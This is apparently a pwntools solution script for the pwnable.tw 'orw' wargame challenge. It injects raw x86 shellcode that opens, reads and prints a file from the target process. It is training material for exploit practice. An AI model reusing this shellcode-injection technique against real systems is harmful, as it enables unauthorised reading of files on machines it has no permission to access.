from pwn import *

#context.log_level = 'debug'
p = process("./orw");
#p = remote('chall.pwnable.tw' ,10001)
#context.terminal = ['gnome-terminal','-x','sh','-c']
#gdb.attach(proc.pidof(p)[0])


shellcode = "\xb9\x02\x00\x00\x00\xbb\xd0\xa0\x04\x08\xb8\x05\x00\x00\x00\xcd\x80\xba\x20\x00\x00\x00\xb9\xb0\xa0\x04\x08\x89\xc3\xb8\x03\x00\x00\x00\xcd\x80\x83\xf8\xff\x74\x0e\x50\x68\xb0\xa0\x04\x08\xe8\x05\x00\x00\x00\x83\xc4\x08\xeb\xfe\x55\x89\xe5\x8b\x4d\x08\x8b\x55\x0c\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80\xc9\xc3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x66\x69\x6c\x65\x00"

p.recvuntil(":")
p.sendline(shellcode)
p.interactive()